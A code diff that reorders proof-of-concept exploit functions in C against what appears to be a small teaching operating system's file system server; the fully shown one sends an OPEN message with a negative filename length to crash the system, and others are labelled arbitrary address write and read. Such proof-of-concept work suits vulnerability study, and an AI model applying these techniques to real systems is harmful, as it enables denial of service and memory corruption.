@@ -2,7 +2,22 @@
 #include "cmd_head.h"
 #include "stdio.h"
 
-int poc1() // 任意地址写
+int poc1() // 触发系统崩溃重启
+{
+    MESSAGE msg;
+    char path[] = "poc2_test";
+    memset(&msg, 0, sizeof(msg));
+    msg.type = OPEN;
+    msg.FLAGS = O_RDWR | O_CREAT;
+    msg.PATHNAME = path;
+    msg.NAME_LEN = -1; // 恶意设置文件名长度为负值
+    printf("hacking...NAME_LEN=%d...\n", msg.NAME_LEN);
+    send_recv(BOTH, TASK_FS, &msg);
+    printf("ret:%d,errorcode:%d\n", msg.type, msg.RETVAL);
+    return 0;
+}
+
+int poc2() // 任意地址写
 {
     // 1. 创建并写入文件
     int fd = open("poc1file", O_CREAT | O_RDWR);
@@ -31,20 +46,6 @@ int poc1() // 任意地址写
     return 0;
 }
 
-int poc2() // 触发系统崩溃重启
-{
-    MESSAGE msg;
-    char path[] = "poc2_test";
-    memset(&msg, 0, sizeof(msg));
-    msg.type = OPEN;
-    msg.FLAGS = O_RDWR | O_CREAT;
-    msg.PATHNAME = path;
-    msg.NAME_LEN = -1; // 恶意设置文件名长度为负值
-    printf("hacking...NAME_LEN=%d...\n", msg.NAME_LEN);
-    send_recv(BOTH, TASK_FS, &msg);
-    printf("ret:%d,errorcode:%d\n", msg.type, msg.RETVAL);
-    return 0;
-}
 
 int poc3()//任意地址读
 {
